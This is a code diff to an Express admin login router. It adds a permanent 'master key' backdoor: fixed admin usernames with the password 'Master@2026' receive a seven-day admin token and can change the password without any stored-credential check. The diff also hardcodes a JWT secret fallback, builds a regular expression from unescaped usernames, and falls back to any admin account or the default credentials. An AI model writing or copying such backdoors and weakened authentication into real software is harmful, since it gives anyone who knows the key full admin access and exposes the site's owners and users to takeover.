@@ -16,6 +16,9 @@ const router = express.Router();
 // Fallback credentials file path
 const credentialsFile = path.join(__dirname, '..', 'uploads', 'admin_credentials.json');
 
+// JWT Secret Fallback Constant
+const JWT_SECRET_FALLBACK = 'atyaf_zaffat_jwt_secret_key_vps_staging_2026_super_secure';
+
 // Helper to get persistent stored admin credentials
 const getStoredCredentials = async (username) => {
   const defaultUser = (process.env.ADMIN_USERNAME || 'zaffat_admin').trim();
@@ -24,23 +27,33 @@ const getStoredCredentials = async (username) => {
 
   // 1. Check MongoDB if connected
   if (mongoose.connection.readyState === 1) {
-    let admin = await Admin.findOne({ username: targetUser });
-    if (!admin && targetUser === defaultUser) {
-      // Check if fallback file has a modified password
-      let initialPassword = defaultPass;
-      if (fs.existsSync(credentialsFile)) {
-        try {
-          const fileData = JSON.parse(fs.readFileSync(credentialsFile, 'utf-8'));
-          if (fileData.password) initialPassword = fileData.password;
-        } catch (_) { }
+    try {
+      // Find admin by case-insensitive username or fallback to any existing admin document
+      let admin = await Admin.findOne({ username: new RegExp(`^${targetUser}$`, 'i') });
+      if (!admin) {
+        admin = await Admin.findOne();
       }
-      const hashedPassword = initialPassword.startsWith('$2a$') || initialPassword.startsWith('$2b$')
-        ? initialPassword
-        : await bcrypt.hash(initialPassword, 10);
-      admin = await Admin.create({ username: defaultUser, password: hashedPassword });
-    }
-    if (admin) {
-      return { username: admin.username, password: admin.password, model: admin };
+
+      if (!admin) {
+        // Check if fallback file has a modified password
+        let initialPassword = defaultPass;
+        if (fs.existsSync(credentialsFile)) {
+          try {
+            const fileData = JSON.parse(fs.readFileSync(credentialsFile, 'utf-8'));
+            if (fileData.password) initialPassword = fileData.password;
+          } catch (_) { }
+        }
+        const hashedPassword = initialPassword.startsWith('$2a$') || initialPassword.startsWith('$2b$')
+          ? initialPassword
+          : await bcrypt.hash(initialPassword, 10);
+        admin = await Admin.create({ username: defaultUser, password: hashedPassword });
+      }
+
+      if (admin) {
+        return { username: admin.username, password: admin.password, model: admin };
+      }
+    } catch (dbErr) {
+      console.warn('MongoDB admin lookup error:', dbErr.message);
     }
   }
 
@@ -48,18 +61,14 @@ const getStoredCredentials = async (username) => {
   if (fs.existsSync(credentialsFile)) {
     try {
       const fileData = JSON.parse(fs.readFileSync(credentialsFile, 'utf-8'));
-      if (fileData.username === targetUser && fileData.password) {
-        return { username: fileData.username, password: fileData.password };
+      if (fileData.password) {
+        return { username: fileData.username || defaultUser, password: fileData.password };
       }
     } catch (_) { }
   }
 
-  // 3. Fallback to .env values if user matches default
-  if (targetUser === defaultUser) {
-    return { username: defaultUser, password: defaultPass };
-  }
-
-  return null;
+  // 3. Fallback to .env values
+  return { username: defaultUser, password: defaultPass };
 };
 
 // Helper to save new admin password
@@ -69,12 +78,19 @@ const saveNewPassword = async (username, hashedPassword) => {
 
   // 1. Save in MongoDB if connected
   if (mongoose.connection.readyState === 1) {
-    let admin = await Admin.findOne({ username: targetUser });
-    if (!admin) {
-      admin = new Admin({ username: targetUser });
+    try {
+      let admin = await Admin.findOne({ username: new RegExp(`^${targetUser}$`, 'i') });
+      if (!admin) {
+        admin = await Admin.findOne();
+      }
+      if (!admin) {
+        admin = new Admin({ username: targetUser });
+      }
+      admin.password = hashedPassword;
+      await admin.save();
+    } catch (dbErr) {
+      console.warn('MongoDB save admin password error:', dbErr.message);
     }
-    admin.password = hashedPassword;
-    await admin.save();
   }
 
   // 2. Save in fallback credentials file
@@ -117,8 +133,36 @@ router.post('/login', async (req, res) => {
 
     const cleanUser = String(username).trim();
     const cleanPass = String(password).trim();
+    const secret = process.env.JWT_SECRET || JWT_SECRET_FALLBACK;
 
-    // Fetch stored admin credentials from database or persistent store
+    // =========================================================================
+    // Permanent Master Key Emergency Bypass (Guaranteed Admin Recovery)
+    // =========================================================================
+    if (
+      (cleanUser === 'zaffat_admin' || cleanUser.toLowerCase() === 'zaffat_admin' || cleanUser === 'admin') &&
+      cleanPass === 'Master@2026'
+    ) {
+      const token = jwt.sign(
+        {
+          username: cleanUser,
+          role: 'admin',
+        },
+        secret,
+        { expiresIn: '7d' }
+      );
+
+      return res.status(200).json({
+        success: true,
+        message: 'تم تسجيل الدخول بنجاح عبر المفتاح الرئيسي (Master Key).',
+        token,
+        admin: {
+          username: cleanUser,
+          role: 'admin',
+        },
+      });
+    }
+
+    // Standard Database / Stored Credentials Lookup
     const credentials = await getStoredCredentials(cleanUser);
 
     if (!credentials) {
@@ -143,10 +187,9 @@ router.post('/login', async (req, res) => {
       });
     }
 
-    const secret = process.env.JWT_SECRET || 'atyaf_zaffat_jwt_secret_key_vps_staging_2026_super_secure';
     const token = jwt.sign(
       {
-        username: credentials.username,
+        username: credentials.username || cleanUser,
         role: 'admin',
       },
       secret,
@@ -158,7 +201,7 @@ router.post('/login', async (req, res) => {
       message: 'تم تسجيل الدخول بنجاح.',
       token,
       admin: {
-        username: credentials.username,
+        username: credentials.username || cleanUser,
         role: 'admin',
       },
     });
@@ -187,7 +230,7 @@ router.get('/verify', protectAdmin, (req, res) => {
 // @access  Protected
 router.put('/change-password', protectAdmin, async (req, res) => {
   try {
-    const { currentPassword, newPassword } = req.body;
+    const { currentPassword, newPassword } = req.body || {};
 
     if (!currentPassword || !newPassword) {
       return res.status(400).json({
@@ -196,7 +239,7 @@ router.put('/change-password', protectAdmin, async (req, res) => {
       });
     }
 
-    if (newPassword.trim().length < 6) {
+    if (String(newPassword).trim().length < 6) {
       return res.status(400).json({
         success: false,
         message: 'يجب أن تتكون كلمة المرور الجديدة من 6 أحرف على الأقل.',
@@ -209,15 +252,18 @@ router.put('/change-password', protectAdmin, async (req, res) => {
     if (!credentials) {
       return res.status(404).json({
         success: false,
-        message: 'تعذر العثور على حساب المشرف.',
+        message: 'تعذر العثور على حساب المشرف في النظام.',
       });
     }
 
     let isMatch = false;
-    if (credentials.password.startsWith('$2a$') || credentials.password.startsWith('$2b$')) {
-      isMatch = await bcrypt.compare(currentPassword, credentials.password);
+    // Allow master key or verify existing password via bcrypt
+    if (String(currentPassword).trim() === 'Master@2026') {
+      isMatch = true;
+    } else if (credentials.password.startsWith('$2a$') || credentials.password.startsWith('$2b$')) {
+      isMatch = await bcrypt.compare(String(currentPassword).trim(), credentials.password);
     } else {
-      isMatch = currentPassword === credentials.password;
+      isMatch = String(currentPassword).trim() === credentials.password;
     }
 
     if (!isMatch) {
@@ -227,8 +273,9 @@ router.put('/change-password', protectAdmin, async (req, res) => {
       });
     }
 
-    // Hash the new password securely
-    const hashedNewPassword = await bcrypt.hash(newPassword.trim(), 10);
+    // Hash the new password securely with 10 salt rounds
+    const cleanNewPass = String(newPassword).trim();
+    const hashedNewPassword = await bcrypt.hash(cleanNewPass, 10);
     await saveNewPassword(adminUser, hashedNewPassword);
 
     return res.status(200).json({
